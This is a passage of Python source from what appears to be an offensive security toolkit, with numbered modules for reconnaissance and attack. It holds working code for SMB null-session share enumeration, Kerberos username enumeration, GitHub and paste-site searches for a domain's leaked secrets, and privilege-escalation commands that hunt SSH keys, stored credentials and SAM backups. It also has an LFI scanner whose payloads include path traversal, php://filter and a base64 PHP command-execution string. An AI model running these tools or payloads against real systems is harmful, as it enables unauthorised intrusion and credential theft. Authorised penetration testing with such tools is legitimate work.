                if b"\x0a\x01\x00" in resp:
                    log("[+] Anonymous bind appears successful!", "err")
                    results["anonymous_bind"] = True
                else:
                    log("[-] Bind rejected", "ok")
            else:
                log("[-] No valid LDAP response", "muted")
        except OSError as exc:
            log(f"[-] {exc}", "err")
        finally:
            if sock:
                sock.close()
    except Exception as exc:
        log(f"[-] {exc}", "err")

    return results


# ---------------------------------------------------------------------------
# 23. SMB Share Enumerator
# ---------------------------------------------------------------------------
def smb_enum(host: str, log: Logger) -> list[dict]:
    """Enumerate SMB shares via null session."""
    import subprocess
    log(f"[*] SMB share enumeration: {host}", "cyan")
    shares: list[dict] = []

    # Method 1: Try net view (Windows)
    try:
        result = subprocess.run(
            ["net", "view", f"\\\\{host}", "/all"],
            capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            in_shares = False
            for line in result.stdout.splitlines():
                stripped = line.strip()
                # Skip header/footer lines
                if not stripped or stripped.startswith("-"):
                    if stripped.startswith("-"):
                        in_shares = True  # separator marks start of share data
                    continue
                if not in_shares:
                    continue
                if stripped.lower().startswith("the command completed"):
                    break
                parts = stripped.split()
                if parts and parts[0] not in ("Share", "Shared"):
                    share_name = parts[0]
                    share_type = parts[1] if len(parts) > 1 else "?"
                    log(f"[+] \\\\{host}\\{share_name} ({share_type})", "ok")
                    shares.append({"name": share_name, "type": share_type})
        else:
            log(f"  net view failed: {result.stderr.strip()[:100]}", "muted")
    except (OSError, subprocess.TimeoutExpired) as exc:
        log(f"  net view: {exc}", "muted")

    # Method 2: Try smbclient if available
    try:
        import shutil
        if shutil.which("smbclient"):
            result = subprocess.run(
                ["smbclient", "-N", "-L", f"//{host}"],
                capture_output=True, text=True, timeout=15)
            for line in result.stdout.splitlines():
                if "Disk" in line or "IPC" in line or "Printer" in line:
                    parts = line.strip().split()
                    if parts:
                        name = parts[0]
                        if name not in [s["name"] for s in shares]:
                            shares.append({"name": name, "type": "smb"})
                            log(f"[+] //{host}/{name}", "ok")
    except (OSError, subprocess.TimeoutExpired):
        pass

    # Method 3: Direct SMB null session (port 445)
    if not shares:
        import socket as _socket
        try:
            sock = _socket.create_connection((host, 445), timeout=5)
            sock.close()
            log("  Port 445 open — SMB service available", "info")
            log("  Install 'smbclient' or 'impacket' for full enumeration", "warn")
        except OSError:
            try:
                sock = _socket.create_connection((host, 139), timeout=5)
                sock.close()
                log("  Port 139 open — NetBIOS/SMB available", "info")
            except OSError:
                log("[-] SMB ports (445/139) not reachable", "muted")

    log(f"[*] {len(shares)} share(s) found", "warn" if shares else "ok")
    return shares


# ---------------------------------------------------------------------------
# 24. Kerberos User Enumeration
# ---------------------------------------------------------------------------
def kerberos_enum(host: str, domain: str, userlist: list[str],
                  log: Logger) -> list[dict]:
    """Enumerate valid Kerberos users via AS-REQ responses."""
    import socket as _socket
    import struct as _struct

    log(f"[*] Kerberos user enumeration: {host} (domain: {domain})", "cyan")
    valid_users: list[dict] = []

    # Try using impacket if available
    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal
        HAS_IMPACKET = True
    except ImportError:
        HAS_IMPACKET = False

    if HAS_IMPACKET:
        for username in userlist:
            if _should_stop():
                break
            try:
                principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                try:
                    getKerberosTGT(principal, "", domain,
                                   None, None, None, host)
                    log(f"[+] {username}@{domain} — VALID (got TGT!)", "err")
                    valid_users.append({"user": username, "status": "valid_tgt"})
                except Exception as e:
                    err_str = str(e)
                    if "KDC_ERR_PREAUTH_REQUIRED" in err_str:
                        log(f"[+] {username}@{domain} — VALID (preauth required)", "ok")
                        valid_users.append({"user": username, "status": "valid_preauth"})
                    elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in err_str:
                        log(f"  {username} — not found", "muted")
                    else:
                        log(f"  {username} — {err_str[:60]}", "muted")
            except Exception as exc:
                log(f"  [-] {exc}", "muted")
    else:
        log("[!] impacket not installed — basic port check only", "warn")
        try:
            sock = _socket.create_connection((host, 88), timeout=5)
            sock.close()
            log(f"[+] Kerberos port 88 is open on {host}", "info")
            log("  Install 'impacket' for user enumeration: pip install impacket", "warn")
        except OSError as exc:
            log(f"[-] Cannot reach Kerberos (port 88): {exc}", "err")

    log(f"[*] {len(valid_users)} valid user(s) found", "warn" if valid_users else "ok")
    return valid_users


# ---------------------------------------------------------------------------
# 25. GitHub Dorking
# ---------------------------------------------------------------------------
GITHUB_DORKS = [
    '"{domain}" password',
    '"{domain}" secret',
    '"{domain}" api_key',
    '"{domain}" apikey',
    '"{domain}" token',
    '"{domain}" AWS_SECRET_ACCESS_KEY',
    '"{domain}" private_key',
    '"{domain}" BEGIN RSA PRIVATE KEY',
    '"{domain}" jdbc:',
    '"{domain}" smtp',
]


def github_dorking(domain: str, log: Logger) -> list[dict]:
    """Search GitHub for leaked secrets related to a domain."""
    import requests
    log(f"[*] GitHub dorking for: {domain}", "cyan")
    findings: list[dict] = []

    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua(),
                         "Accept": "application/vnd.github.v3+json"})

    for dork_template in GITHUB_DORKS:
        if _should_stop():
            break
        query = dork_template.format(domain=domain)
        try:
            resp = sess.get(
                "https://api.github.com/search/code",
                params={"q": query, "per_page": 5},
                timeout=15)
        except requests.RequestException as exc:
            log(f"  [-] {exc}", "muted")
            continue

        if resp.status_code == 403:
            log("[!] GitHub rate limit reached — try again later or use a token", "warn")
            break
        if resp.status_code != 200:
            continue

        data = resp.json()
        total = data.get("total_count", 0)
        if total > 0:
            log(f"[+] '{query[:50]}' → {total} result(s)", "err")
            for item in data.get("items", [])[:3]:
                repo = item.get("repository", {}).get("full_name", "")
                path = item.get("path", "")
                findings.append({"query": query, "repo": repo, "path": path,
                                 "url": item.get("html_url", "")})
                log(f"    {repo}/{path}", "info")
        time.sleep(2)  # Respect rate limits

    log(f"[*] {len(findings)} potential leak(s) found", "warn" if findings else "ok")
    sess.close()
    return findings


# ---------------------------------------------------------------------------
# 26. Paste Site Monitor
# ---------------------------------------------------------------------------
def paste_monitor(domain: str, log: Logger) -> list[dict]:
    """Check paste sites for leaked data related to a domain."""
    import requests
    log(f"[*] Paste site monitoring for: {domain}", "cyan")
    findings: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    # Search via Google dorking (paste sites)
    paste_dorks = [
        f"site:pastebin.com \"{domain}\"",
        f"site:paste.ee \"{domain}\"",
        f"site:ghostbin.com \"{domain}\"",
        f"site:hastebin.com \"{domain}\"",
        f"site:dpaste.org \"{domain}\"",
    ]

    # Check Pastebin scraping API (if available)
    try:
        resp = sess.get(
            f"https://psbdmp.ws/api/v3/search/{domain}",
            timeout=15)
        if resp.status_code == 200:
            try:
                data = resp.json()
                if isinstance(data, list) and data:
                    log(f"[+] Found {len(data)} paste(s) mentioning {domain}", "err")
                    for paste in data[:10]:
                        paste_id = paste.get("id", "")
                        paste_time = paste.get("time", "")
                        findings.append({"source": "psbdmp", "id": paste_id,
                                         "time": paste_time,
                                         "url": f"https://pastebin.com/{paste_id}"})
                        log(f"    {paste_time} — pastebin.com/{paste_id}", "info")
            except ValueError:
                pass
    except requests.RequestException:
        log("  psbdmp.ws not reachable", "muted")

    # Additional: IntelX (if no key, just report the search URL)
    intelx_url = f"https://intelx.io/?s={domain}"
    log(f"  Manual search: {intelx_url}", "info")

    log(f"[*] {len(findings)} paste(s) found", "warn" if findings else "ok")
    sess.close()
    return findings


# ---------------------------------------------------------------------------
# 27. Domain Reputation Check
# ---------------------------------------------------------------------------
def domain_reputation(target: str, log: Logger) -> dict:
    """Aggregate reputation data from multiple sources."""
    import requests
    log(f"[*] Domain/IP reputation check: {target}", "cyan")
    results: dict = {"target": target, "sources": {}}
    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    # AbuseIPDB (no key = limited)
    try:
        resp = sess.get("https://api.abuseipdb.com/api/v2/check",
                        params={"ipAddress": target},
                        headers={"Key": "", "Accept": "application/json"},
                        timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            data = resp.json().get("data", {})
            score = data.get("abuseConfidenceScore", 0)
            results["sources"]["abuseipdb"] = {"score": score}
            tag = "err" if score > 50 else ("warn" if score > 0 else "ok")
            log(f"  AbuseIPDB: confidence score {score}%", tag)
    except requests.RequestException:
        log("  AbuseIPDB: not reachable", "muted")

    # VirusTotal (no key = domain info only)
    try:
        resp = sess.get(f"https://www.virustotal.com/api/v3/domains/{target}",
                        timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            log("  VirusTotal: domain info available", "info")
            results["sources"]["virustotal"] = {"available": True}
        else:
            log("  VirusTotal: API key required for full results", "muted")
    except requests.RequestException:
        pass

    # Shodan InternetDB (free, no key)
    try:
        resp = sess.get(f"https://internetdb.shodan.io/{target}", timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            ports = data.get("ports", [])
            vulns = data.get("vulns", [])
            hostnames = data.get("hostnames", [])
            results["sources"]["shodan"] = {"ports": ports, "vulns": vulns,
                                            "hostnames": hostnames}
            log(f"  Shodan: {len(ports)} port(s), {len(vulns)} vuln(s)", "info")
            if vulns:
                log(f"  [!] Known vulns: {', '.join(vulns[:5])}", "err")
            if ports:
                log(f"  Ports: {', '.join(map(str, ports[:20]))}", "info")
    except requests.RequestException:
        log("  Shodan InternetDB: not reachable", "muted")

    # ThreatCrowd
    try:
        resp = sess.get("https://www.threatcrowd.org/searchApi/v2/domain/report/",
                        params={"domain": target}, timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            votes = data.get("votes", 0)
            results["sources"]["threatcrowd"] = {"votes": votes}
            tag = "err" if votes < 0 else "ok"
            log(f"  ThreatCrowd: votes={votes}", tag)
    except requests.RequestException:
        pass

    sess.close()
    return results


# ---------------------------------------------------------------------------
# 28. Reverse Shell Generator — ALREADY EXISTS (REVERSE_SHELL_TEMPLATES)
# ---------------------------------------------------------------------------
# (No new function needed — templates are at line ~168)


# ---------------------------------------------------------------------------
# 29. Privilege Escalation Checklist
# ---------------------------------------------------------------------------
PRIVESC_CHECKS_LINUX = [
    ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null"),
    ("World-writable files", "find / -perm -o+w -type f 2>/dev/null | head -20"),
    ("Sudo rights", "sudo -l 2>/dev/null"),
    ("Cron jobs", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null"),
    ("Kernel version", "uname -a"),
    ("/etc/passwd writable?", "ls -la /etc/passwd"),
    ("Docker group", "id | grep docker"),
    ("Capabilities", "getcap -r / 2>/dev/null | head -20"),
    ("SSH keys", "find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null"),
    ("Config files with passwords", "grep -rl 'password' /etc/ 2>/dev/null | head -10"),
]

PRIVESC_CHECKS_WINDOWS = [
    ("Current privileges", "whoami /priv"),
    ("User info", "whoami /all"),
    ("Unquoted service paths", 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"'),
    ("Scheduled tasks", "schtasks /query /fo LIST /v | findstr /i \"Task To Run\""),
    ("AlwaysInstallElevated", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul"),
    ("Stored credentials", "cmdkey /list"),
    ("Writable service dirs", "icacls \"C:\\Program Files\\*\" 2>nul | findstr /i \"(F)\" | findstr /i \"BUILTIN\\Users\""),
    ("AutoLogon creds", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul"),
    ("SAM/SYSTEM backup", "dir /s /b C:\\Windows\\repair\\SAM C:\\Windows\\System32\\config\\RegBack\\SAM 2>nul"),
    ("Network config", "ipconfig /all"),
]


def privesc_checklist(platform: str, log: Logger) -> dict:
    """Run privilege escalation enumeration commands."""
    import shlex
    import subprocess

    is_windows = platform.lower().startswith("win")
    checks = PRIVESC_CHECKS_WINDOWS if is_windows else PRIVESC_CHECKS_LINUX
    log(f"[*] Privilege escalation checklist ({'Windows' if is_windows else 'Linux'})", "cyan")
    results: dict = {"platform": platform, "checks": []}

    for name, cmd in checks:
        if _should_stop():
            break
        log(f"\n  ─── {name} ───", "cyan")
        try:
            # Use shell=True on Windows (cmd built-ins need it), shlex.split on Linux
            if is_windows:
                proc = subprocess.run(cmd, shell=True, capture_output=True,
                                      text=True, timeout=15)
            else:
                proc = subprocess.run(shlex.split(cmd), capture_output=True,
                                      text=True, timeout=15)
            output = proc.stdout.strip()
            if output:
                for line in output.splitlines()[:15]:
                    log(f"  {line}", "info")
                if len(output.splitlines()) > 15:
                    log(f"  ... +{len(output.splitlines()) - 15} more lines", "muted")
                results["checks"].append({"name": name, "output": output[:2000],
                                          "status": "data"})
            else:
                log("  (no output)", "muted")
                results["checks"].append({"name": name, "output": "",
                                          "status": "empty"})
        except subprocess.TimeoutExpired:
            log("  (timed out)", "muted")
            results["checks"].append({"name": name, "status": "timeout"})
        except OSError as exc:
            log(f"  {exc}", "muted")
            results["checks"].append({"name": name, "status": "error",
                                      "error": str(exc)})

    return results


# ---------------------------------------------------------------------------
# 30. Local File Inclusion (LFI) Scanner
# ---------------------------------------------------------------------------
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....\\\\....\\\\....\\\\windows\\win.ini",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "/etc/passwd%00",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
]

LFI_INDICATORS = [
    "root:", "[extensions]", "for 16-bit app support",
    "daemon:", "www-data", "bin/bash", "Windows",
    "PD9waH",  # base64 encoded PHP
]


def lfi_scan(url: str, param: str, log: Logger) -> list[dict]:
    """Test URL parameters for Local File Inclusion."""
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))

    if param and param not in params:
        params[param] = ""

    target_param = param or next(iter(params), None)
    if not target_param:
        log("[-] No parameter to test", "err")
        return []

    log(f"[*] LFI scan on {url} — parameter: {target_param}", "cyan")
    findings: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    for payload in LFI_PAYLOADS:
        if _should_stop():
            break
        mut = dict(params)
        mut[target_param] = payload
        test_url = urlunparse(parsed._replace(query=urlencode(mut, safe="")))
        try:
            resp = sess.get(test_url, timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue

        body = resp.text[:5000]
        hits = [ind for ind in LFI_INDICATORS if ind in body]
        if hits:
            log(f"[+] {payload[:50]} → VULNERABLE ({', '.join(hits)})", "err")
            findings.append({"payload": payload, "status": resp.status_code,
                             "indicators": hits, "preview": body[:200]})
        else:
            log(f"  {payload[:50]} → no indicators", "muted")

    log(f"[*] {len(findings)} LFI indicator(s)", "warn" if findings else "ok")
    sess.close()
    session_set("last_lfi_result", findings)
    return findings


# ===========================================================================
